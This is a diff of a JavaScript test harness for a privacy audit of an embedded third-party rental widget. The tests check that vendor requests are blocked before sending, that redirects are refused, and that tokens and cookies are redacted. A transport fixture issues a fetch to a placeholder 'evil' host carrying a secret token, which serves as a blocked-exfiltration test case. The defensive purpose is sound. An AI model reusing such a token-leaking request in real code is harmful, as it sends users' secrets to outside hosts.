@@ -19,6 +19,7 @@ import {
   assessPublishedCapture,
   compareReference,
   createAuditGate,
+  createAuditRunner,
   inspectTarget,
   nestedContractHref,
   sanitizeEvents,
@@ -103,17 +104,25 @@ function runPure() {
   const secondHealth = gate.observe({ url: HEALTH, method: 'GET', resourceType: 'script', now: startedAt + 40, contextRole: 'vendor' })
   assert.equal(secondHealth.reason, 'health-repeat')
   gate.observe({
-    url: `https://${SECRET_HOST}/collect?token=${SECRET_VALUE}`,
+    url: `https://${SECRET_HOST}/collect?visitor_abc123=1&token=${SECRET_VALUE}&currency=chf`,
     method: 'GET',
     resourceType: 'image',
     now: startedAt + 50,
     contextRole: 'vendor',
   })
+  gate.observe({ url: NESTED, method: 'GET', resourceType: 'document', now: startedAt + 60, contextRole: 'vendor' })
   const early = gate.evidence()
-  assert.equal(JSON.stringify(early).includes(SECRET_VALUE), false)
-  assert.equal(JSON.stringify(early).includes(SECRET_HOST), false)
-  assert.equal(JSON.stringify(early).includes('redirect-target.example'), false)
-  assert.equal(early.ledger.some((row) => row.reason === 'unmatched' && row.queryKeys.includes('token') && row.endpoint === 'unlisted'), true)
+  const earlyText = JSON.stringify(early)
+  assert.equal(earlyText.includes(SECRET_VALUE), false)
+  assert.equal(earlyText.includes(SECRET_HOST), false)
+  assert.equal(earlyText.includes('visitor_abc123'), false)
+  assert.equal(earlyText.includes('token'), false)
+  assert.equal(earlyText.includes('Mietwagen'), false)
+  assert.equal(earlyText.includes('redirect-target.example'), false)
+  const secretRow = early.ledger.find((row) => row.reason === 'unmatched' && row.endpoint === 'unlisted')
+  assert.deepEqual(secretRow.queryKeys, ['currency'])
+  assert.equal(secretRow.unknownQueryKeys, 2)
+  assert.equal(inspectTarget(NESTED, 'GET', 'document').ok, true)
 
   const budget = createAuditGate({ startedAt, mode: 'phase-a' })
   for (let index = 0; index < 99; index += 1) {
@@ -179,6 +188,126 @@ function runPure() {
   assert.equal(sanitizeEvents([], { unreadable: true }).gap, 'unreadable-frame')
 }
 
+async function runAdapter() {
+  const fetches = []
+  const closed = createAuditRunner({
+    fetchImpl(url) {
+      fetches.push(String(url))
+      throw new Error('provider fetch')
+    },
+  })
+  assert.equal(closed.providerTransmission, false)
+  assert.equal((await closed.boundedGet({ url: LOADER, resourceType: 'script', now: 10 })).reason, 'not-started')
+  const startedAt = 1_000_000
+  assert.equal(closed.start(startedAt).ok, true)
+  assert.equal(closed.start(startedAt).reason, 'already-started')
+  const provider = await closed.boundedGet({ url: LOADER, resourceType: 'script', now: startedAt + 10, contextRole: 'vendor' })
+  assert.equal(provider.transmitted, false)
+  assert.equal(provider.reason, 'provider-closed')
+  assert.equal(provider.retry, false)
+  assert.equal(provider.handedToBrowser, false)
+  assert.equal(fetches.length, 0)
+  const tooLate = await closed.boundedGet({ url: `http://127.0.0.1/not-sent`, resourceType: 'document', now: startedAt + BUDGET_MS })
+  assert.equal(tooLate.reason, 'DEADLINE')
+  assert.equal(tooLate.transmitted, false)
+  assert.equal(fetches.length, 0)
+  closed.recordEvents([{ name: 'gtm.js', payload: SECRET_VALUE }, { name: 'visitor_abc123', payload: SECRET_STORAGE }])
+  closed.recordStorage('parent', {
+    readable: true,
+    storageEntries: 1,
+    cookies: [{ name: SECRET_COOKIE, value: SECRET_STORAGE, secure: true, sameSite: 'Lax' }],
+  })
+  const closedText = JSON.stringify(closed.evidence())
+  assert.equal(closedText.includes(SECRET_VALUE), false)
+  assert.equal(closedText.includes('visitor_abc123'), false)
+  assert.equal(closedText.includes(SECRET_COOKIE), false)
+  assert.equal(closedText.includes('discovercars.com'), false)
+  assert.equal(closed.evidence().events[0].events.some((item) => item.name === 'gtm.js'), true)
+
+  const budgetRunner = createAuditRunner({
+    fetchImpl(url) {
+      fetches.push(String(url))
+      throw new Error('budget fetch')
+    },
+  })
+  budgetRunner.start(startedAt)
+  for (let index = 0; index < 99; index += 1) {
+    const row = await budgetRunner.boundedGet({ url: LOADER, resourceType: 'script', now: startedAt + index })
+    assert.equal(row.reason, 'provider-closed')
+  }
+  const hundredth = await budgetRunner.boundedGet({ url: 'http://127.0.0.1/blocked', resourceType: 'document', now: startedAt + 99 })
+  assert.equal(hundredth.reason, 'BUDGET_REACHED')
+  assert.equal(hundredth.transmitted, false)
+  const later = await budgetRunner.boundedGet({ url: 'http://127.0.0.1/later', resourceType: 'document', now: startedAt + 100 })
+  assert.equal(later.reason, 'BUDGET_REACHED')
+  assert.equal(later.transmitted, false)
+  assert.equal(budgetRunner.evidence().gate.observed, 101)
+  assert.equal(budgetRunner.evidence().gate.lateAttempts, 1)
+  assert.equal(budgetRunner.evidence().gate.trimmed, false)
+  assert.equal(fetches.length, 0)
+
+  let sourceHits = 0
+  let targetHits = 0
+  const target = createHttpServer((request, response) => {
+    targetHits += 1
+    response.statusCode = 204
+    response.end()
+  })
+  const targetPort = await listen(target)
+  const source = createHttpServer((request, response) => {
+    sourceHits += 1
+    response.statusCode = 302
+    response.setHeader('Location', `http://127.0.0.1:${targetPort}/landed`)
+    response.end()
+  })
+  const sourcePort = await listen(source)
+  const hung = createHttpServer(() => {})
+  const hungPort = await listen(hung)
+  const live = createAuditRunner()
+  try {
+    live.start(startedAt)
+    const redirect = await live.boundedGet({
+      url: `http://127.0.0.1:${sourcePort}/redirect-source`,
+      resourceType: 'document',
+      now: startedAt + 20,
+    })
+    assert.equal(redirect.reason, 'BLOCKED_REDIRECT')
+    assert.equal(redirect.status, 302)
+    assert.equal(redirect.retry, false)
+    assert.equal(redirect.follow, null)
+    assert.equal(redirect.handedToBrowser, false)
+    assert.equal(sourceHits, 1)
+    assert.equal(targetHits, 0)
+    assert.equal(JSON.stringify(live.evidence()).includes('/landed'), false)
+    const pending = live.boundedGet({
+      url: `http://127.0.0.1:${hungPort}/hang`,
+      resourceType: 'document',
+      now: startedAt + 30,
+    })
+    await new Promise((resolve) => setTimeout(resolve, 40))
+    live.trip('navigation')
+    const aborted = await Promise.race([
+      pending,
+      new Promise((_, reject) => setTimeout(() => reject(new Error('teardown did not settle the open GET')), 2000)),
+    ])
+    assert.equal(aborted.transmitted, false)
+    assert.equal(aborted.handedToBrowser, false)
+    const after = await live.boundedGet({
+      url: `http://127.0.0.1:${sourcePort}/redirect-source`,
+      resourceType: 'document',
+      now: startedAt + 40,
+    })
+    assert.equal(after.transmitted, false)
+    assert.equal(sourceHits, 1)
+    assert.equal(targetHits, 0)
+    assert.equal(live.evidence().tornDown, true)
+    assert.equal(live.evidence().teardownReason, 'navigation')
+  } finally {
+    await Promise.all([source, target, hung].map((server) => new Promise((resolve) => server.close(resolve))))
+  }
+  return { sourceHits, targetHits, providerFetches: fetches.length }
+}
+
 function listen(server) {
   return new Promise((resolve) => {
     server.listen(0, '127.0.0.1', () => resolve(server.address().port))
@@ -211,8 +340,13 @@ async function runBrowser(plan) {
     websocket: { proven: false, disposition: 'BLOCKED_TRANSPORT', connectToServer: 0 },
     webrtc: { proven: false, disposition: 'BLOCKED_TRANSPORT', method: null },
   }
-  const startedAt = Date.now()
-  const gate = createAuditGate({ startedAt, mode: 'phase-a' })
+  const runner = createAuditRunner({
+    fetchImpl(url, init) {
+      const parsed = new URL(url)
+      if (parsed.hostname !== '127.0.0.1') throw new Error('provider fetch refused')
+      return fetch(url, init)
+    },
+  })
   try {
     const context = await browser.newContext({ serviceWorkers: 'block' })
     await context.routeWebSocket(/.*/, (socket) => {
@@ -229,9 +363,7 @@ async function runBrowser(plan) {
       const url = request.url()
       seen.push(url)
       if (request.redirectedFrom()) redirectFollows += 1
-      const now = Date.now()
       if (url.startsWith(`${PARENT_ORIGIN}/parent`)) {
-        gate.observe({ localFulfill: true, localRole: 'local-parent', method: request.method(), resourceType: request.resourceType(), now, contextRole: 'parent', phase: 'before-start' })
         await route.fulfill({
           status: 200,
           headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' },
@@ -241,7 +373,6 @@ async function runBrowser(plan) {
       }
       if (url === `${CHILD_ORIGIN}/embed/discovercars`) {
         const shell = buildShell('discovercars', { plan })
-        gate.observe({ localFulfill: true, localRole: 'local-host', method: request.method(), resourceType: request.resourceType(), now, contextRole: 'host', phase: 'before-start' })
         await route.fulfill({
           status: shell.status,
           headers: Object.fromEntries(shell.headers.entries()),
@@ -250,7 +381,6 @@ async function runBrowser(plan) {
         return
       }
       if (url === `http://127.0.0.1:${httpPort}/transport`) {
-        gate.observe({ localFulfill: true, localRole: 'local-fixture', method: request.method(), resourceType: request.resourceType(), now, contextRole: 'fixture', phase: 'initial-load' })
         await route.fulfill({
           status: 200,
           headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' },
@@ -258,20 +388,21 @@ async function runBrowser(plan) {
         })
         return
       }
-      const upstreamStatus = url === `http://127.0.0.1:${httpPort}/redirect-source` ? 302 : 0
-      gate.observe({
-        url,
-        method: request.method(),
-        resourceType: request.resourceType(),
-        now,
-        upstreamStatus,
-        contextRole: 'vendor',
-        phase: 'initial-load',
-      })
+      if (runner.startedAt !== null && request.method() === 'GET') {
+        const result = await runner.boundedGet({
+          url,
+          resourceType: request.resourceType(),
+          now: Date.now(),
+          contextRole: 'vendor',
+        })
+        if (result.transmitted || result.handedToBrowser || result.follow !== null) throw new Error('phase A transmitted a request')
+      }
       abortCount += 1
       await route.abort('blockedbyclient')
     })
     const page = await context.newPage()
+    await page.goto(`http://127.0.0.1:${httpPort}/transport`, { waitUntil: 'domcontentloaded' })
+    await page.waitForFunction(() => document.body.dataset.done === '1', { timeout: 8000 })
     const childResponse = page.waitForResponse((response) => response.url() === `${CHILD_ORIGIN}/embed/discovercars`)
     const framePromise = page.waitForEvent('framenavigated', {
       predicate: (item) => item.url().startsWith(`${CHILD_ORIGIN}/embed/discovercars`),
@@ -289,6 +420,14 @@ async function runBrowser(plan) {
     assert.equal(servedCsp.includes('googletagmanager'), false)
     await frame.waitForFunction(() => {
       const status = document.getElementById('jetnity-widget-status')
+      return status && status.textContent.includes('Eine Freigabe wurde angefragt')
+    }, { timeout: 8000 })
+    if (seen.includes(LOADER)) throw new Error('loader started before the explicit intent')
+    const startedAt = Date.now()
+    assert.equal(runner.start(startedAt).ok, true)
+    await page.evaluate(() => window.__jetnity.start())
+    await frame.waitForFunction(() => {
+      const status = document.getElementById('jetnity-widget-status')
       return status && status.textContent.includes('Ein Skript wurde eingefügt')
     }, { timeout: 8000 })
     if (!seen.includes(LOADER)) throw new Error('loader was not routed before any continue')
@@ -304,8 +443,15 @@ async function runBrowser(plan) {
       localCount: localStorage.length,
       sessionCount: sessionStorage.length,
     }))
-    await page.goto(`http://127.0.0.1:${httpPort}/transport`, { waitUntil: 'domcontentloaded' })
-    await page.waitForFunction(() => document.body.dataset.done === '1', { timeout: 8000 })
+    const frameEvents = await frame.evaluate(() => {
+      const layer = window.dataLayer
+      if (!Array.isArray(layer)) return []
+      return layer.map((item) => ({ name: item && typeof item.event === 'string' ? item.event : 'unnamed' }))
+    })
+    runner.recordEvents(frameEvents)
+    runner.recordStorage('parent', { readable: true, storageEntries: parentStorage.localCount + parentStorage.sessionCount, cookies: [] })
+    runner.recordStorage('host', { readable: true, storageEntries: hostStorage.localCount + hostStorage.sessionCount, cookies: [] })
+    runner.recordGap('vendor-frame-absent')
     transport.http.proven = seen.includes(LOADER) && continueCount === 0 && httpHits.length === 0
     transport.http.disposition = transport.http.proven ? 'BLOCKED_PRE_SEND' : 'BLOCKED_TRANSPORT'
     transport.beacon.proven = seen.some((url) => url.endsWith('/beacon')) && continueCount === 0 && httpHits.length === 0
@@ -330,7 +476,7 @@ async function runBrowser(plan) {
       vendorStorage: { gap: 'vendor-frame-absent' },
       childStatus: 'inserted-script-not-form-proof',
       servedFrame: servedCsp.includes(`frame-src ${DISCOVERCARS_AUDIT_FRAME_SRC}`),
-      gate: gate.evidence(),
+      runner: runner.evidence(),
     }
   } finally {
     await browser.close()
@@ -346,6 +492,8 @@ function parentHtml() {
 ${runtime}
 const iframe = document.createElement('iframe')
 iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin')
+let allow = false
+let pending = null
 const fixture = createParentFixture({
   provider: 'discovercars',
   childOrigin: '${CHILD_ORIGIN}',
@@ -353,10 +501,21 @@ const fixture = createParentFixture({
   parentGeneration: 1,
   policyId: '${AUDIT_POLICY_ID}',
   artifactSha256: '5a9ea3edf4bfa5762850e0d1e6c9f5d777d860f9442fbe17bf9a76b1618cc8aa',
-  allowsGrant: () => true,
+  allowsGrant: () => allow,
   postToChild(grant) { iframe.contentWindow.postMessage(grant, '${CHILD_ORIGIN}') },
 })
-window.addEventListener('message', (event) => { fixture.onMessage(event) })
+window.__jetnity = {
+  start() {
+    allow = true
+    const event = pending
+    pending = null
+    if (event) fixture.onMessage(event)
+  },
+}
+window.addEventListener('message', (event) => {
+  if (!allow) { pending = event; return }
+  fixture.onMessage(event)
+})
 iframe.src = new URLSearchParams(location.search).get('src')
 document.body.appendChild(iframe)
 </script></body></html>`
@@ -365,7 +524,6 @@ document.body.appendChild(iframe)
 function transportHtml(httpPort, tcpPort) {
   return `<!DOCTYPE html><body data-done="0"><script>
 const beaconUrl = ${JSON.stringify(`http://127.0.0.1:${httpPort}/beacon`)}
-const redirectUrl = ${JSON.stringify(`http://127.0.0.1:${httpPort}/redirect-source`)}
 const eventsUrl = ${JSON.stringify(`http://127.0.0.1:${httpPort}/events`)}
 const socketUrl = ${JSON.stringify(`ws://127.0.0.1:${tcpPort}/socket`)}
 const evilUrl = ${JSON.stringify(`https://${SECRET_HOST}/collect?token=${SECRET_VALUE}`)}
@@ -380,9 +538,8 @@ async function main() {
     socket.addEventListener('close', finish)
     setTimeout(finish, 1000)
   })
-  try { await fetch(redirectUrl) } catch { /* aborted */ }
   try { await fetch(evilUrl) } catch { /* aborted */ }
-  try { await fetch(${JSON.stringify(LOADER)}, { method: 'POST' }) } catch { /* aborted */ }
+  try { await fetch(${JSON.stringify(`http://127.0.0.1:${httpPort}/method-probe`)}, { method: 'POST' }) } catch { /* aborted */ }
   await new Promise((resolve) => {
     const source = new EventSource(eventsUrl)
     const finish = () => { source.close(); resolve() }
@@ -397,12 +554,15 @@ main()
 }
 
 runPure()
+const adapter = await runAdapter()
 const plan = clientPlan('discovercars', selection())
 if (!plan) throw new Error('audit plan was not serialized')
 const browserEvidence = await runBrowser(plan)
+const browserGate = browserEvidence.runner.gate
 const summary = {
   phase: 'A',
   phaseBAuthorized: false,
+  providerTransmission: false,
   productionSelected: false,
   continueCount: browserEvidence.continueCount,
   abortCount: browserEvidence.abortCount,
@@ -411,27 +571,31 @@ const summary = {
   tcpLeaks: browserEvidence.tcpLeaks,
   serviceWorkers: browserEvidence.serviceWorkers,
   transport: browserEvidence.transport,
-  storage: {
-    parent: browserEvidence.parentStorage,
-    host: browserEvidence.hostStorage,
-    vendor: browserEvidence.vendorStorage,
+  adapter: {
+    sourceHits: adapter.sourceHits,
+    targetHits: adapter.targetHits,
+    providerFetches: adapter.providerFetches,
   },
+  storage: browserEvidence.runner.storage,
+  gaps: browserEvidence.runner.gaps,
+  events: browserEvidence.runner.events,
   childStatus: browserEvidence.childStatus,
   servedFrame: browserEvidence.servedFrame,
   gate: {
-    observed: browserEvidence.gate.observed,
-    lateAttempts: browserEvidence.gate.lateAttempts,
-    disposition: browserEvidence.gate.disposition,
-    trimmed: browserEvidence.gate.trimmed,
-    retryScheduled: browserEvidence.gate.retryScheduled,
-    reasons: browserEvidence.gate.ledger.reduce((counts, row) => {
+    observed: browserGate.observed,
+    lateAttempts: browserGate.lateAttempts,
+    disposition: browserGate.disposition,
+    trimmed: browserGate.trimmed,
+    retryScheduled: browserGate.retryScheduled,
+    reasons: browserGate.ledger.reduce((counts, row) => {
       counts[row.reason] = (counts[row.reason] || 0) + 1
       return counts
     }, {}),
+    unknownQueryKeys: browserGate.ledger.reduce((sum, row) => sum + row.unknownQueryKeys, 0),
   },
 }
 const serialized = JSON.stringify(summary)
-for (const secret of [SECRET_VALUE, SECRET_BODY, SECRET_HOST, SECRET_COOKIE, SECRET_STORAGE]) {
+for (const secret of [SECRET_VALUE, SECRET_BODY, SECRET_HOST, SECRET_COOKIE, SECRET_STORAGE, 'visitor_abc123']) {
   if (serialized.includes(secret)) throw new Error('redaction failed')
 }
 if (browserEvidence.continueCount !== 0 || browserEvidence.httpLeaks !== 0 || browserEvidence.tcpLeaks !== 0) {
